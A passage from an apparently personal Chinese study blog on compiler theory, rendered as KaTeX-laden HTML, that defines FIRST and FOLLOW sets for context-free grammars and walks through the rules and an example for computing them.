class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span> 定义<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>的首符号集</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>α</mi><msup><mo>⇒</mo><mo>∗</mo></msup><mi>a</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)=\{a|\alpha\Rightarrow^*a...., a\in V_T^*\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">a</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.025331em;vertical-align:-0.275331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.275331em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></p><blockquote><p>这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">V_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示终结符号集合。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示非终结符号集合，即语法变量集合。</p><p>实际上FIRST集就是某个符号可以经过若干步推导得到的第一个符号为终结符号的所有符号。</p></blockquote><p>当然了，如果你开始一开始本身就是一个终结符号，你自己肯定也在你的first集中啦！</p><p><img src="https://upyun.wuuconix.link/image-20211108200707443.png" alt="first实例" /></p><p>这里举个例子，比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">First(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span>。T能够推到为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><msup><mi>T</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">FT&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>。因为First集中的字符都是推导后的第一个字符，这也是first的含义，故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">First(T)=First(F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span>。我们再看F能够推导出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">(E)|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span>。首先括号是一个终结符号，然后id也是一个非终结符号。故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><mo separator="true">,</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(F)=\{(,id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span>。</p><p>如果考试直接让我们写出一个变量的first集的话，应该算是送分题了！</p><h3 id="follow集"><a class="markdownIt-Anchor" href="#follow集"></a> Follow集</h3><p>定义：对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">\forall(A)\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∀</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>定义A的后续符号集：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>S</mi><msup><mo>⇒</mo><mo>∗</mo></msup><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>A</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FOLLOW(A)=\{a|S\Rightarrow^* ...Aa..., a\in V_T\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">L</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">a</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathdefault">A</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></p><h3 id="followa的求法"><a class="markdownIt-Anchor" href="#followa的求法"></a> Follow(A)的求法</h3><ol><li><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mo>→</mo><mi>α</mi><mi>A</mi><mi>a</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">B\rightarrow \alpha A a \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault">A</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>，a是终结符，则a放入follow集中</p><blockquote><p>这和定义完全一致，不多说</p></blockquote></li><li><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mo>→</mo><mi>α</mi><mi>A</mi><mi>X</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">B\rightarrow \alpha AX\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>，X是非终结符，则把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(X\beta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span>放入Follow集中。注意需要删除first集合中的空串<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></p><blockquote><p>follow集的定义中看起来那个非终结符号一定要紧紧挨着A。确实应该这样，但是有时候又可以不是这样，在A和a中如果夹了一些语法变量的话，在现在看来可能a不是follow集中的值，但是如果那些语法变量通过推导变为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>了，这时a又是follow集中的值了。这里就把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">X\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>可以推导出的第一个语法变量【follow集已经帮你做好了推导】，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>X</mi><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">First(X\beta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span>放入follow集中了。</p><p>Follow集中貌似是没有空串的，如果first集中有空串，记得删除。见书P141</p></blockquote></li><li><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mo>→</mo><mi>α</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">B\rightarrow \alpha A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault">A</span></span></span></span>或者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mo>→</mo><mi>α</mi><mi>A</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">B \rightarrow \alpha A \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>，但<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>⇒</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\beta \Rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>，则把Follow(B)放到Follow(A)中。</p><blockquote><p>因为A在B的末尾，follow(A)就是follow(B)挺好理解的。你可能会疑惑follow(B)怎么求，这里我们就不用管啦，因为信息还不够，在式子中B后面可能还有式子了，比如Bc。</p></blockquote></li><li><p>若A是开始符，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\$\in FOLLOW(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">$</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">L</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mclose">)</span></span></span></span>。</p><blockquote><p>这里的$应该和汇编中的符号相同，表示字符串的结束。</p></blockquote></li><li><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow\alpha B \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>，那么将所有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\beta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span>中除了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>以外的所有符号都在FOLLOW(B)中。</p></li><li><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A\rightarrow\alpha B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>或者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow\alpha B\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\beta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span>中包含<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>，那么FOLLOW(A)中所有的符号都在FOLLOW(B)中。</p></li></ol><h3 id="求follow集的例子"><a class="markdownIt-Anchor" href="#求follow集的例子"></a> 求follow集的例子</h3><p>只能感叹求follow比求first难多了，需要把以上六条规则烂熟于心，而且在求follow之前，你得先把first集都求出来，因为会用到。</p><p><img src="https://upyun.wuuconix.link/image-20211108205154420.png" alt="例子1" /></p><p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20211108205200224.png" alt="first集" /></p><p>这里直接把first集给你了，然后让你求follow集。</p><p><img 